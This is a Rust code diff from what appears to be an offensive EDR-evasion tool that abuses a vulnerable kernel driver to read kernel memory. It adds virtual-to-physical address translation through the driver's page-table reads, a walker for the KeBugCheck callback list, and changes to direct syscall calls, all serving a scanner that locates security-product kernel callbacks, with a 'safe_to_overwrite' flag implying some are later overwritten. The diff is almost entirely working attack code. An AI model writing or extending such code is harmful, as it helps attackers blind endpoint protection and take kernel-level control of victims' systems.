@@ -117,7 +117,7 @@ fn get_kernel_base() -> Result<u64> {
 
     // First call: get required buffer size.
     unsafe {
-        let _ = nt_syscall::syscall!(
+        let _ = syscall!(
             "NtQuerySystemInformation",
             11u32, // SystemModuleInformation
             0 as *mut u8,
@@ -134,7 +134,7 @@ fn get_kernel_base() -> Result<u64> {
     let mut return_length: u32 = 0;
 
     let status = unsafe {
-        nt_syscall::syscall!(
+        syscall!(
             "NtQuerySystemInformation",
             11u32,
             buffer.as_mut_ptr(),
@@ -164,22 +164,102 @@ fn get_kernel_base() -> Result<u64> {
     Ok(first_entry.image_base as u64)
 }
 
+/// Translate a kernel virtual address to a physical address by reading the
+/// corresponding page table entry (PTE) via the driver.
+///
+/// Uses the Windows x64 PTE base (`MmPteBase`, hardcoded to
+/// `0xFFFFF68000000000` on Windows 10/11) to locate the PTE for the given
+/// virtual address, reads the 8-byte PTE, extracts the page frame number
+/// (bits 12–51), and computes the physical address.
+///
+/// # Chicken-and-egg limitation
+///
+/// Reading the PTE itself requires issuing a read through the driver.  The
+/// PTE lives at a *virtual* address (`MmPteBase + offset`), so this function
+/// calls `deploy::read_physical_memory` with that virtual address.  For
+/// drivers that internally handle VA→PA conversion (the common case — e.g.
+/// via `MmMapIoSpace` or `MmGetPhysicalAddress`), the driver transparently
+/// translates the PTE address and the read succeeds.  For a truly
+/// physical-only driver (one that passes the supplied address directly to
+/// `MmMapIoSpace` with no conversion), this would fail because the PTE
+/// address is virtual.  A complete solution for such drivers would require
+/// CR3 bootstrapping (reading the page tables starting from a known physical
+/// address obtained from the KPROCESS.DirectoryTableBase field).  No driver
+/// in the current database has `needs_physical_addr = true`, so this
+/// limitation is theoretical.
+unsafe fn translate_va_to_pa(
+    driver: &super::driver_db::VulnerableDriver,
+    device_handle: usize,
+    kernel_addr: u64,
+) -> Result<u64> {
+    // Windows x64 PTE base (MmPteBase).
+    // On Windows 10/11 x64 this is 0xFFFFF68000000000.
+    // Ideally resolved from kernel exports via resolve_kernel_symbol, but
+    // that function itself calls read_kernel_memory, so we hardcode to
+    // avoid infinite recursion.
+    let pte_base: u64 = 0xFFFF_F680_0000_0000;
+
+    // Compute the PTE address for the given virtual address.
+    // PTE VA = MmPteBase + ((VA >> 9) & 0x7FFFFFFFF8)
+    let pte_va = pte_base + ((kernel_addr >> 9) & 0x7FFF_FFFF_FFF8);
+
+    // Read the PTE (8 bytes) via the driver.
+    let mut pte_buf = [0u8; 8];
+    deploy::read_physical_memory(driver, device_handle, pte_va, &mut pte_buf)?;
+
+    let pte_value = u64::from_le_bytes(pte_buf);
+
+    // PTE must be present (bit 0).
+    if pte_value & 1 == 0 {
+        bail!(
+            "PTE not present for VA 0x{:016X} (PTE@0x{:016X} = 0x{:016X})",
+            kernel_addr,
+            pte_va,
+            pte_value
+        );
+    }
+
+    // Extract page frame number (bits 12–51).
+    let pfn = (pte_value >> 12) & 0xF_FFFF_FFFF_u64;
+
+    // Physical address = (PFN << PAGE_SHIFT) | byte_offset_within_page.
+    let phys_addr = (pfn << 12) | (kernel_addr & 0xFFF);
+
+    log::trace!(
+        "VA→PA: 0x{:016X} → 0x{:016X} (PTE=0x{:016X}, PFN=0x{:X})",
+        kernel_addr,
+        phys_addr,
+        pte_value,
+        pfn
+    );
+
+    Ok(phys_addr)
+}
+
 /// Read kernel virtual memory through the vulnerable driver.
 ///
-/// Translates a kernel virtual address to a physical address using the
-/// driver's read capability, then reads the physical memory.
+/// When the driver accepts virtual addresses (`needs_physical_addr = false`,
+/// the common case), the kernel VA is passed directly to the driver's IOCTL.
+/// The driver internally converts VA→PA (e.g. via `MmMapIoSpace` or
+/// `MmGetPhysicalAddress`).
 ///
-/// For drivers that support direct virtual memory access (most do via
-/// MmMapIoSpace internally), we can skip the translation step.
+/// When the driver requires a physical address (`needs_physical_addr = true`),
+/// this function first translates the kernel VA to a PA by reading the
+/// corresponding PTE through the driver, then issues the physical read.
 unsafe fn read_kernel_memory(
     driver: &super::driver_db::VulnerableDriver,
     device_handle: usize,
     kernel_addr: u64,
     buffer: &mut [u8],
 ) -> Result<()> {
-    // Most vulnerable drivers with PhysicalMemory mapping use MmMapIoSpace
-    // internally, so we pass the virtual address directly.
-    deploy::read_physical_memory(driver, device_handle, kernel_addr, buffer)
+    if !driver.needs_physical_addr {
+        // Driver accepts virtual addresses and handles VA→PA internally.
+        deploy::read_physical_memory(driver, device_handle, kernel_addr, buffer)
+    } else {
+        // Driver expects a physical address. Translate VA → PA first.
+        let phys_addr = translate_va_to_pa(driver, device_handle, kernel_addr)?;
+        deploy::read_physical_memory(driver, device_handle, phys_addr, buffer)
+    }
 }
 
 /// Resolve the address of a kernel export symbol by walking ntoskrnl's PE.
@@ -337,7 +417,7 @@ fn identify_module(driver: &super::driver_db::VulnerableDriver, device_handle: u
     let mut buf_size: u32 = 0;
 
     unsafe {
-        let _ = nt_syscall::syscall!(
+        let _ = syscall!(
             "NtQuerySystemInformation",
             11u32,
             0 as *mut u8,
@@ -350,7 +430,7 @@ fn identify_module(driver: &super::driver_db::VulnerableDriver, device_handle: u
     let mut return_length: u32 = 0;
 
     let status = unsafe {
-        nt_syscall::syscall!(
+        syscall!(
             "NtQuerySystemInformation",
             11u32,
             buffer.as_mut_ptr(),
@@ -479,6 +559,95 @@ fn walk_callback_array(
     Ok(callbacks)
 }
 
+/// Walk the KeBugCheckCallbackListHead linked list.
+///
+/// `KeBugCheckCallbackListHead` is the head of a doubly-linked `LIST_ENTRY`
+/// list of `KBUGCHECK_CALLBACK_RECORD` structures — **not** a flat array like
+/// the `Psp*` callback routine arrays.  Using `walk_callback_array` on it
+/// produces garbage because it misinterprets the LIST_ENTRY Flink/Blink
+/// pointers as callback function pointers.
+///
+/// `KBUGCHECK_CALLBACK_RECORD` layout (x64):
+///   +0x00: LIST_ENTRY Entry  (Flink, Blink)
+///   +0x10: PVOID CallbackRoutine
+///   +0x18: PVOID Buffer
+///   +0x20: ULONG Length
+///   +0x28: PUCHAR ComponentName
+///
+/// BugCheck callbacks are **never** overwritten by Orchestra — they are
+/// enumerated purely for detection / situational awareness.
+fn walk_bugcheck_callback_list(
+    driver: &super::driver_db::VulnerableDriver,
+    device_handle: usize,
+    list_head_addr: u64,
+) -> Result<Vec<CallbackInfo>> {
+    let mut callbacks = Vec::new();
+    let max_walk = 256; // Safety limit to prevent infinite loops.
+    let mut visited = std::collections::HashSet::new();
+
+    // Read the Flink of the list head to get the first record.
+    let mut flink_buf = [0u8; 8];
+    unsafe {
+        read_kernel_memory(driver, device_handle, list_head_addr, &mut flink_buf)?;
+    }
+    let mut current = u64::from_le_bytes(flink_buf);
+
+    for _ in 0..max_walk {
+        // Back to head or null → done.
+        if current == 0 || current == list_head_addr {
+            break;
+        }
+
+        // Cycle detection for corrupted lists.
+        if !visited.insert(current) {
+            log::warn!(
+                "BugCheck callback list cycle detected at 0x{:016X}, stopping",
+                current
+            );
+            break;
+        }
+
+        // Read the CallbackRoutine pointer at offset +0x10.
+        let mut func_buf = [0u8; 8];
+        match unsafe {
+            read_kernel_memory(driver, device_handle, current + 0x10, &mut func_buf)
+        } {
+            Ok(()) => {
+                let func_addr = u64::from_le_bytes(func_buf);
+                if func_addr != 0 {
+                    let owner = identify_module(driver, device_handle, func_addr)
+                        .unwrap_or_else(|_| "unknown".to_string());
+
+                    callbacks.push(CallbackInfo {
+                        list_type: CallbackListType::BugCheck,
+                        index: callbacks.len(),
+                        block_address: current,
+                        function_address: func_addr,
+                        owner_module: owner,
+                        safe_to_overwrite: false, // BugCheck callbacks are NEVER overwritten.
+                    });
+                }
+            }
+            Err(e) => {
+                log::warn!(
+                    "Failed to read BugCheck callback record at 0x{:016X}: {}",
+                    current,
+                    e
+                );
+                break;
+            }
+        }
+
+        // Follow Flink to the next record.
+        unsafe {
+            read_kernel_memory(driver, device_handle, current, &mut flink_buf)?;
+        }
+        current = u64::from_le_bytes(flink_buf);
+    }
+
+    Ok(callbacks)
+}
+
 /// Main entry point: discover all EDR kernel callbacks.
 ///
 /// # Arguments
@@ -503,9 +672,6 @@ pub fn scan_callbacks(deployed: &DeployedDriver) -> Result<ScanResult> {
         ("PspCreateProcessNotifyRoutine", CallbackListType::ProcessCreate),
         ("PspCreateThreadNotifyRoutine", CallbackListType::ThreadCreate),
         ("PspLoadImageNotifyRoutine", CallbackListType::ImageLoad),
-        // CallbackListHead is a linked list, not an array — handled separately.
-        // KeBugCheckCallbackListHead — enumerated but NEVER overwritten.
-        ("KeBugCheckCallbackListHead", CallbackListType::BugCheck),
     ];
 
     let mut all_callbacks = Vec::new();
@@ -543,7 +709,31 @@ pub fn scan_callbacks(deployed: &DeployedDriver) -> Result<ScanResult> {
         }
     }
 
-    // Step 3: Walk CallbackListHead (generic object manager callbacks).
+    // Step 3: Walk KeBugCheckCallbackListHead (linked list, NOT an array).
+    // BugCheck callbacks are NEVER overwritten — enumerated for detection only.
+    match resolve_kernel_symbol(driver, device_handle, kernel_base, "KeBugCheckCallbackListHead")
+    {
+        Ok(list_head) => {
+            log::info!(
+                "Resolved KeBugCheckCallbackListHead at 0x{:016X}",
+                list_head
+            );
+            match walk_bugcheck_callback_list(driver, device_handle, list_head) {
+                Ok(cbs) => {
+                    log::info!("Found {} BugCheck callbacks", cbs.len());
+                    all_callbacks.extend(cbs);
+                }
+                Err(e) => {
+                    log::warn!("Failed to walk KeBugCheckCallbackListHead: {}", e);
+                }
+            }
+        }
+        Err(e) => {
+            log::warn!("Failed to resolve KeBugCheckCallbackListHead: {}", e);
+        }
+    }
+
+    // Step 4: Walk CallbackListHead (generic object manager callbacks).
     // This is a linked list of CALLBACK_ENTRY_ITEM, not a flat array.
     match resolve_kernel_symbol(driver, device_handle, kernel_base, "CallbackListHead") {
         Ok(list_head) => {
